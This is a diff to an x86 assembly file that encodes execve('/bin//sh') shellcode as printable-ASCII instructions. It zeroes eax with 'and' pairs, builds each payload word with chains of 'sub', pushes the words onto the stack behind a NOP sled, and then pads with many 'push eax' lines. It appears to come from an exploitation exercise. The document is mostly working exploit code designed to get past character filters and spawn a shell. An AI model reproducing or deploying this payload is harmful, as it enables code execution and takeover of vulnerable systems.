@@ -12,98 +12,74 @@ global _start
 		;========================
 		push esp
 		pop eax
-		; add eax, 1024 <==> sub eax, (2**32 - 1024)
-        sub eax, 4d4d4d4dH
-        sub eax, 4d4d4d4dH
-        sub eax, 65656166H
+		; add eax, 828 <==> sub eax, (2**32 - 828)
+		sub eax, 55555569H
+		sub eax, 55555669H
+		sub eax, 5655576aH
 		push eax
 		pop esp
 		;========================
-		;  set $eax = shellcode[0:-4]
-		; \x58\x99\xcd\x80
-		; reverse : 
-		; \x80\xcd\x99\x58
-		;========================
-		; set $eax = 0
-		and eax, 49494949H
-		and eax, 30303030H
-sub eax, 2ac02238H
-sub eax, 2a392238H
-sub eax, 2a392238H
-		push eax
-		;========================
-		;  set $eax = shellcode[-8:-4]
-		; \x89\xe3\x6a\x0b
-		; reverse : 
-		; \x0b\x6a\xe3\x89
+		;  set eax = 5899cd80
 		;========================
 		and eax, 49494949H
 		and eax, 30303030H
-		sub eax, 5232c028H
-		sub eax, 51312e28H
-		sub eax, 51312e27H
+		sub eax, 3822652bH
+		sub eax, 3822662bH
+		sub eax, 3721672aH
 		push eax
 		;========================
-		;  set $eax = shellcode[-12:-8]
-		; \x2f\x62\x69\x6e
-		; reverse : 
-		; \x6e\x69\x62\x2f
+		;  set eax = 89e36a0b
 		;========================
 		and eax, 49494949H
 		and eax, 30303030H
-		sub eax, 31323546H
-		sub eax, 30323446H
-		sub eax, 30323445H
+		sub eax, 275e3252H
+		sub eax, 275e3252H
+		sub eax, 27603151H
 		push eax
 		;========================
-		;  set $eax = shellcode[-16:-12]
-		; \x2f\x73\x68\x68
-		; reverse : 
-		; \x68\x68\x73\x2f
+		;  set eax = 2f62696e
 		;========================
 		and eax, 49494949H
 		and eax, 30303030H
-sub eax, 33332f46H
-sub eax, 32322f46H
-sub eax, 32322e45H
+		sub eax, 46353231H
+		sub eax, 45343231H
+		sub eax, 45343230H
 		push eax
 		;========================
-		;  set $eax = shellcode[-20:-16]
-		; \xc9\x51\x68\x2f
-		; reverse : 
-		; \x2f\x68\x51\xc9
+		;  set eax = 2f736868
 		;========================
 		and eax, 49494949H
 		and eax, 30303030H
-sub eax, 46333ac0H
-sub eax, 45323a3cH
-sub eax, 4532393bH
+		sub eax, 462f3333H
+		sub eax, 452f3233H
+		sub eax, 452e3232H
 		push eax
 		;========================
-		;  set $eax = shellcode[-21:-20]
-		; \x90\x90\x90\x31
-		; reverse : 
-		; \x31\x90\x90\x90
+		;  set eax = c951682f
 		;========================
 		and eax, 49494949H
 		and eax, 30303030H
-sub eax, 45252526H
-sub eax, 45252525H
-sub eax, 44252525H
+		sub eax, 673a3346H
+		sub eax, 673a3246H
+		sub eax, 683a3245H
 		push eax
 		;========================
-		;  set $eax = \x90\x90\x90\x90 (nop)
+		;  set eax = 90909031
 		;========================
 		and eax, 49494949H
 		and eax, 30303030H
-sub eax, 25252526H
-sub eax, 25252525H
-sub eax, 25252525H
+		sub eax, 25252545H
+		sub eax, 25252545H
+		sub eax, 25252545H
 		push eax
 		;========================
-		; fill pad with nop ; then $eip = $esp
-		; and the shellcode is going to be excute
+		;  set eax = 90909090
 		;========================
+		and eax, 49494949H
+		and eax, 30303030H
+		sub eax, 25252526H
+		sub eax, 25252525H
+		sub eax, 25252525H
 		push eax
 		push eax
 		push eax
@@ -139,3 +115,71 @@ sub eax, 25252525H
 		push eax
 		push eax
 		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+
